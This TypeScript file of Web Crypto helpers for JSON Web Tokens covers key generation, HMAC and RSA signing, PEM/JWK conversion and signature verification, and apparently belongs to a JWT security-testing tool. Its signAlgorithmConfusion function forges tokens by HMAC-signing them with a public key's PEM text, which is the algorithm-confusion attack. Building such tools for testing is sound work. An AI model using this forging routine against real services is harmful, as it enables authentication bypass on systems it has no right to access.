// Web Crypto API helpers - RSA/EC key generation, HMAC signing, etc.

import { base64UrlEncodeBytes, base64UrlDecodeBytes } from "./jwt";

function selectHashAlgorithm(alg: string): AlgorithmIdentifier {
  if (alg.endsWith("384")) return "SHA-384";
  if (alg.endsWith("512")) return "SHA-512";
  return "SHA-256";
}

export interface RsaKeyPair {
  publicKey: CryptoKey;
  privateKey: CryptoKey;
  publicKeyJwk: JsonWebKey;
  privateKeyJwk: JsonWebKey;
  publicKeyPem: string;
}

export async function generateRsaKeyPair(): Promise<RsaKeyPair> {
  const pair = await crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"]
  );

  const publicKeyJwk = await crypto.subtle.exportKey("jwk", pair.publicKey);
  const privateKeyJwk = await crypto.subtle.exportKey("jwk", pair.privateKey);
  const publicKeyDer = await crypto.subtle.exportKey("spki", pair.publicKey);
  const publicKeyPem = derToPem(publicKeyDer, "PUBLIC KEY");

  return {
    publicKey: pair.publicKey,
    privateKey: pair.privateKey,
    publicKeyJwk,
    privateKeyJwk,
    publicKeyPem,
  };
}

export async function signHmacSha256(data: string, keyBytes: Uint8Array): Promise<Uint8Array> {
  // WebCrypto rejects empty keys; HMAC pads keys shorter than block size with zeros (64 bytes for SHA-256)
  const keyData = keyBytes.byteLength === 0
    ? new Uint8Array(64).buffer
    : keyBytes.buffer.slice(keyBytes.byteOffset, keyBytes.byteOffset + keyBytes.byteLength) as ArrayBuffer;
  const key = await crypto.subtle.importKey(
    "raw",
    keyData,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(data));
  return new Uint8Array(sig);
}

export async function signRs256(data: string, privateKeyJwk: JsonWebKey): Promise<Uint8Array> {
  const key = await crypto.subtle.importKey(
    "jwk",
    privateKeyJwk,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign(
    "RSASSA-PKCS1-v1_5",
    key,
    new TextEncoder().encode(data)
  );
  return new Uint8Array(sig);
}

// Algorithm confusion: sign with HMAC using public key PEM bytes as secret
export async function signAlgorithmConfusion(
  headerB64: string,
  payloadB64: string,
  publicKeyPem: string
): Promise<{ token: string; variant: string }[]> {
  const results: { token: string; variant: string }[] = [];
  const data = `${headerB64}.${payloadB64}`;

  // Variant 1: exact PEM string bytes
  const pemBytes = new TextEncoder().encode(publicKeyPem);
  const sig1 = await signHmacSha256(data, pemBytes);
  results.push({
    variant: "PEM exact bytes",
    token: `${data}.${base64UrlEncodeBytes(sig1)}`,
  });

  // Variant 2: PEM without trailing newline
  const pemTrimmed = publicKeyPem.trimEnd();
  const pemTrimmedBytes = new TextEncoder().encode(pemTrimmed);
  const sig2 = await signHmacSha256(data, pemTrimmedBytes);
  results.push({
    variant: "PEM trimmed (no trailing newline)",
    token: `${data}.${base64UrlEncodeBytes(sig2)}`,
  });

  return results;
}

// Import RSA public key from PEM for use in JWK export
export async function importRsaPublicKeyFromPem(pem: string): Promise<CryptoKey> {
  const der = pemToDer(pem);
  return crypto.subtle.importKey(
    "spki",
    der,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    true,
    ["verify"]
  );
}

export async function importRsaPrivateKeyFromJwk(jwk: JsonWebKey): Promise<CryptoKey> {
  return crypto.subtle.importKey(
    "jwk",
    jwk,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    true,
    ["sign"]
  );
}

export function derToPem(der: ArrayBuffer, label: string): string {
  const bytes = new Uint8Array(der);
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  const base64 = btoa(binary);
  const lines = base64.match(/.{1,64}/g) ?? [];
  return `-----BEGIN ${label}-----\n${lines.join("\n")}\n-----END ${label}-----\n`;
}

export function pemToDer(pem: string): ArrayBuffer {
  const base64 = pem
    .replace(/-----BEGIN [^-]+-----/g, "")
    .replace(/-----END [^-]+-----/g, "")
    .replace(/\s/g, "");
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes.buffer;
}

export async function publicKeyJwkFromPem(pem: string): Promise<JsonWebKey> {
  const key = await importRsaPublicKeyFromPem(pem);
  return crypto.subtle.exportKey("jwk", key);
}

// Compute JWK thumbprint (RFC 7638)
export async function jwkThumbprint(jwk: JsonWebKey): Promise<string> {
  let canonical: Record<string, unknown>;
  if (jwk.kty === "RSA") {
    canonical = { e: jwk.e, kty: jwk.kty, n: jwk.n };
  } else if (jwk.kty === "EC") {
    canonical = { crv: jwk.crv, kty: jwk.kty, x: jwk.x, y: jwk.y };
  } else {
    canonical = { k: jwk.k, kty: jwk.kty };
  }
  const data = new TextEncoder().encode(JSON.stringify(canonical));
  const hash = await crypto.subtle.digest("SHA-256", data);
  return base64UrlEncodeBytes(new Uint8Array(hash));
}

// Convert JWKS JSON or single JWK JSON → PEM public key
export async function jwksToPem(input: string): Promise<string> {
  const parsed = JSON.parse(input) as Record<string, unknown>;
  let jwk: JsonWebKey;

  if (Array.isArray(parsed.keys)) {
    const rsaKey = (parsed.keys as unknown[]).find(
      (k): k is JsonWebKey =>
        typeof k === "object" && k !== null && (k as Record<string, unknown>).kty === "RSA"
    );
    if (!rsaKey) throw new Error("No RSA key found in JWKS");
    jwk = rsaKey;
  } else if (parsed.kty === "RSA") {
    jwk = parsed as JsonWebKey;
  } else {
    throw new Error('Expected JWKS {"keys":[...]} or single RSA JWK {"kty":"RSA",...}');
  }

  const hashAlg = typeof jwk.alg === "string" ? selectHashAlgorithm(jwk.alg) : "SHA-256";

  const cleanJwk: JsonWebKey = { kty: jwk.kty, n: jwk.n, e: jwk.e, ext: true };
  const key = await crypto.subtle.importKey(
    "jwk",
    cleanJwk,
    { name: "RSASSA-PKCS1-v1_5", hash: hashAlg },
    true,
    ["verify"]
  );
  const der = await crypto.subtle.exportKey("spki", key);
  return derToPem(der, "PUBLIC KEY");
}

export async function importJwkAsPem(jwk: JsonWebKey): Promise<string> {
  let algorithm: RsaHashedImportParams | EcKeyImportParams | Algorithm;
  if (jwk.kty === "RSA") {
    const hash = typeof jwk.alg === "string" ? selectHashAlgorithm(jwk.alg) : "SHA-256";
    const name = typeof jwk.alg === "string" && jwk.alg.startsWith("PS") ? "RSA-PSS" : "RSASSA-PKCS1-v1_5";
    algorithm = { name, hash };
  } else if (jwk.kty === "EC") {
    algorithm = { name: "ECDSA", namedCurve: jwk.crv ?? "P-256" };
  } else if (jwk.kty === "OKP") {
    algorithm = { name: "Ed25519" };
  } else {
    throw new Error(`Unsupported key type: ${jwk.kty}`);
  }
  const key = await crypto.subtle.importKey("jwk", { ...jwk, ext: true }, algorithm, true, ["verify"]);
  const der = await crypto.subtle.exportKey("spki", key);
  return derToPem(der, "PUBLIC KEY");
}

export async function verifyAsymmetricSignature(
  rawHeader: string,
  rawPayload: string,
  rawSignature: string,
  alg: string,
  publicKeyPem: string
): Promise<boolean> {
  const data = new TextEncoder().encode(`${rawHeader}.${rawPayload}`);
  const sigRaw = base64UrlDecodeBytes(rawSignature);
  const sigBytes = sigRaw.buffer.slice(sigRaw.byteOffset, sigRaw.byteOffset + sigRaw.byteLength) as ArrayBuffer;
  const der = pemToDer(publicKeyPem);

  let key: CryptoKey;
  let verifyParams: AlgorithmIdentifier | RsaPssParams | EcdsaParams;

  if (alg.startsWith("RS")) {
    const hash = selectHashAlgorithm(alg);
    key = await crypto.subtle.importKey("spki", der, { name: "RSASSA-PKCS1-v1_5", hash }, false, ["verify"]);
    verifyParams = "RSASSA-PKCS1-v1_5";
  } else if (alg.startsWith("PS")) {
    const hash = selectHashAlgorithm(alg);
    const saltLength = alg === "PS384" ? 48 : alg === "PS512" ? 64 : 32;
    key = await crypto.subtle.importKey("spki", der, { name: "RSA-PSS", hash }, false, ["verify"]);
    verifyParams = { name: "RSA-PSS", saltLength };
  } else if (alg.startsWith("ES")) {
    const crv = alg === "ES384" ? "P-384" : alg === "ES512" ? "P-521" : "P-256";
    const hash = selectHashAlgorithm(alg);
    key = await crypto.subtle.importKey("spki", der, { name: "ECDSA", namedCurve: crv }, false, ["verify"]);
    verifyParams = { name: "ECDSA", hash };
  } else if (alg === "EdDSA") {
    key = await crypto.subtle.importKey("spki", der, { name: "Ed25519" }, false, ["verify"]);
    verifyParams = { name: "Ed25519" };
  } else {
    throw new Error(`Unsupported algorithm: ${alg}`);
  }

  return crypto.subtle.verify(verifyParams, key, sigBytes, data);
}

export async function signHmac(
  rawHeader: string,
  rawPayload: string,
  secretBytes: Uint8Array,
  alg: string
): Promise<string> {
  const hashAlg = selectHashAlgorithm(alg);
  const keyMaterial = secretBytes.byteLength === 0
    ? new Uint8Array(64).buffer
    : secretBytes.buffer.slice(secretBytes.byteOffset, secretBytes.byteOffset + secretBytes.byteLength) as ArrayBuffer;
  const key = await crypto.subtle.importKey("raw", keyMaterial, { name: "HMAC", hash: hashAlg }, false, ["sign"]);
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(`${rawHeader}.${rawPayload}`));
  return base64UrlEncodeBytes(new Uint8Array(sig));
}

// Verify an HMAC-signed JWT against a known secret
export async function verifyHmacSignature(
  rawHeader: string,
  rawPayload: string,
  rawSignature: string,
  secretBytes: Uint8Array,
  alg: string
): Promise<boolean> {
  const hashAlg = selectHashAlgorithm(alg);

  const keyMaterial = secretBytes.byteLength === 0
    ? new Uint8Array(64).buffer
    : secretBytes.buffer.slice(secretBytes.byteOffset, secretBytes.byteOffset + secretBytes.byteLength) as ArrayBuffer;

  const key = await crypto.subtle.importKey(
    "raw",
    keyMaterial,
    { name: "HMAC", hash: hashAlg },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign(
    "HMAC",
    key,
    new TextEncoder().encode(`${rawHeader}.${rawPayload}`)
  );
  const computed = base64UrlEncodeBytes(new Uint8Array(sig));
  return computed === rawSignature;
}
